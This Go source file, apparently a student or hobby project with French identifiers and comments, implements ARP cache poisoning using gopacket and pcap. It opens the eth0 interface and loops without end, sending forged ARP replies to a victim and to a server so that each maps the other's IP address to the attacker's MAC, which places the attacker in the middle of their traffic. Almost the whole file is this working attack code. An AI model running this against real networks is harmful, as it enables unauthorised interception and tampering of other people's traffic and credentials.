package main

import (
	"context"
	"net"
	// "time"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func launchPoisoning(global *global, ctx context.Context) {
	handle := createPoisoningHandle("eth0")
	defer handle.Close()
	count := 0
	for {
		select {
		case <-ctx.Done():
			return
		default:
			poisoningARP(handle, global.victime_ip, global.attaquant_mac, global.serveur_ip, global.serveur_mac)
			// probleme ici sur un des cote quand je ping parfois jai de la perte
			poisoningARP(handle, global.serveur_ip, global.attaquant_mac, global.victime_ip, global.victime_mac)
			printPoisoning(&count)
			// time.Sleep(1 * time.Second)
		}
	}
}

func createPoisoningHandle(nameOfdevice string) *pcap.Handle {
	handle, err := pcap.OpenLive(nameOfdevice, 1600, true, pcap.BlockForever)
	if err != nil {
		panic(err)
	}
	return handle
}

func poisoningARP(handle *pcap.Handle, ip_to_usurpate net.IP, attaquant_mac net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr) error {

	eth := layers.Ethernet{
		SrcMAC:       attaquant_mac,
		DstMAC:       mac_target,
		EthernetType: layers.EthernetTypeARP,
	}
	arp := layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(attaquant_mac),
		SourceProtAddress: []byte(ip_to_usurpate.To4()),
		DstHwAddress:      []byte(mac_target),
		DstProtAddress:    []byte(ip_target.To4()),
	}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{
		FixLengths:       true,
		ComputeChecksums: true,
	}
	if err := gopacket.SerializeLayers(buf, opts, &eth, &arp); err != nil {
		panic(err)
	}
	if err := handle.WritePacketData(buf.Bytes()); err != nil {
		panic(err)
	}
	return nil

}
